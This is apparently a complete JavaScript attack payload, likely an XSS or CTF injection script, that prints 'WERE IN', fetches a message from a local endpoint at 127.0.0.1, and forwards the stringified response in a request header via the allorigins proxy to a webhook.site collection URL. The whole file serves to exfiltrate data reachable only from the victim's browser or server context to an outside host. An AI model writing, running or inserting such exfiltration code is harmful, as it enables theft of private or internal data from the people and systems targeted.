console.log("WERE IN");

function getMessage() {
    return fetch('http://127.0.0.1/message/3')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(jsonResponse => {
            return JSON.stringify(jsonResponse); // Convert JSON response to a string
        })
        .catch(error => {
            console.error('There was a problem with the request:', error);
            return null; // Return null in case of error
        });
}

// Usage
getMessage()
    .then(jsonString => {
        fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://webhook.site/d5c2d46d-88cd-4046-88b0-ef84b1511227'), {
  headers: {
    'X-Custom-Header': jsonString
  }
})
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(data => {
    console.log(data.contents); // Handle the JSON response data here
  })
  .catch(error => {
    console.error('There was a problem with the request:', error);
  });
    });




